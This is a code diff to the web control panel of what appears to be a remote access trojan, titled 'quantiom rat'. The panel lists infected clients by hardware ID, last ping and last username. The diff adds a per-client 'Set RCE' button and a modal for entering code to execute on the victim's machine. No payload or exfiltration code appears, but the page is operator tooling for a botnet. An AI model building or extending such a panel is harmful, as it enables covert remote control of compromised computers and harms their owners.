@@ -1,14 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <title>quantiom rat</title>
-
-        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/dt-1.10.21/rg-1.1.2/rr-1.2.7/sp-1.1.1/datatables.min.css" />
-        <link rel="stylesheet" href="./bootstrap/css/bootstrap-dark.css" />
-        <link rel="stylesheet" href="./css/style.css" />
-    </head>
+    <%- include("includes/head.ejs") %>
     <body>
         <div class="container-fluid h-100">
             <%- include("includes/navbar.ejs") %>
@@ -22,32 +14,39 @@
                                 <th scope="col">HWID</th>
                                 <th scope="col">Last Pinged</th>
                                 <th scope="col">Last Username</th>
+                                <th scope="col">Set RCE</th>
                             </tr>
                         </thead>
                         <tbody id="clientTableBody">
                         </tbody>
                     </table>
+                    <!-- Modal -->
+                    <div class="modal fade" id="rceModal" tabindex="-1" role="dialog" aria-labelledby="rceModalLabel" aria-hidden="true">
+                      <div class="modal-dialog" role="document">
+                        <div class="modal-content">
+                          <div class="modal-header">
+                            <h5 class="modal-title" id="rceModalLabel">Set RCE</h5>
+                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                              <span aria-hidden="true">&times;</span>
+                            </button>
+                          </div>
+                          <div class="modal-body">
+                            <textarea class="form-input">
+                              
+                            </textarea>
+                          </div>
+                          <div class="modal-footer">
+                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                            <button type="button" class="btn btn-primary">Save changes</button>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <script
-            src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
-            integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
-            crossorigin="anonymous"
-        ></script>
-        <script
-            src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
-            integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
-            crossorigin="anonymous"
-        ></script>
-        <script
-            src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
-            integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
-            crossorigin="anonymous"
-        ></script>
-        <script src="/socket.io/socket.io.js"></script>
-        <script type="text/javascript" src="https://cdn.datatables.net/v/bs4/dt-1.10.21/rg-1.1.2/rr-1.2.7/sp-1.1.1/datatables.min.js"></script>
+        <%- include("includes/scripts.ejs") %>
         <script type="text/javascript">
           let lastPings = {};
 
@@ -127,9 +126,15 @@
                           
                           if (realHWID == hwid) {
                               $(this).parent('tr').append($('<td>').text(name));
+                              $(this).parent('tr').append($('<td>').append($('<button>').addClass('btn').addClass('btn-sm').addClass('btn-secondary').addClass('set-rce-button').attr('hwid', hwid).text('Click Here')));
                           }
                       }
                   });
+              });
+
+              $('body').delegate('.set-rce-button', 'click', function() {
+                  console.log($(this).attr('hwid'));
+                  $('#rceModal').modal();
               });
 
               $("body").tooltip({ selector: '[data-toggle=tooltip]' });
